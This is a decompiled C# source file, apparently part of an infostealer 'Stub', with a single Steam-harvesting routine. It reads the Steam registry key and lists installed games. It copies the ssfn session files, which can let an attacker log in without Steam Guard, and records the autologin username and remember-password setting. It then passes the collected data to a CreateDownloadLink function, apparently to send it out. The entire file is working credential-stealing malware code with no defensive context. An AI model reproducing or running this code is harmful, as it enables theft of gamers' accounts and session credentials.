using System;
using System.IO;
using Microsoft.Win32;

namespace Stub
{
	// Token: 0x02000033 RID: 51
	public static class Steam
	{
		// Token: 0x060000A0 RID: 160 RVA: 0x00007874 File Offset: 0x00005A74
		public static string GetSteamSession()
		{
			string tempFolder = Program.tempFolder;
			string result;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
				string path = registryKey.GetValue("SteamPath").ToString();
				Directory.CreateDirectory(tempFolder);
				foreach (string text in registryKey.OpenSubKey("Apps").GetSubKeyNames())
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey("Apps\\" + text))
					{
						string text2 = (string)registryKey2.GetValue("Name");
						text2 = (string.IsNullOrEmpty(text2) ? "Unknown" : text2);
						string text3 = ((int)registryKey2.GetValue("Installed") == 1) ? "Yes" : "No";
						string text4 = ((int)registryKey2.GetValue("Running") == 1) ? "Yes" : "No";
						string text5 = ((int)registryKey2.GetValue("Updating") == 1) ? "Yes" : "No";
						File.AppendAllText(tempFolder + "\\Apps.txt", string.Concat(new string[]
						{
							"Application",
							text2,
							"\n\tGameID: ",
							text,
							"\n\tInstalled: ",
							text3,
							"\n\tRunning: ",
							text4,
							"\n\tUpdating: ",
							text5,
							"\n\n"
						}));
					}
				}
				foreach (string text6 in Directory.GetFiles(path))
				{
					if (text6.Contains("ssfn"))
					{
						File.Copy(text6, tempFolder + "\\" + Path.GetFileName(text6));
					}
				}
				string text7 = ((int)registryKey.GetValue("RememberPassword") == 1) ? "Yes" : "No";
				string contents = string.Format(string.Concat(new object[]
				{
					"\nAutologin User: ",
					registryKey.GetValue("AutoLoginUser"),
					"\nRemember password: ",
					text7
				}), new object[0]);
				File.WriteAllText(tempFolder + "\\SteamInfo.txt", contents);
				result = Functions.CreateDownloadLink(tempFolder + "\\SteamInfo.txt");
			}
			catch
			{
				result = "No Steam Found.";
			}
			return result;
		}
	}
}
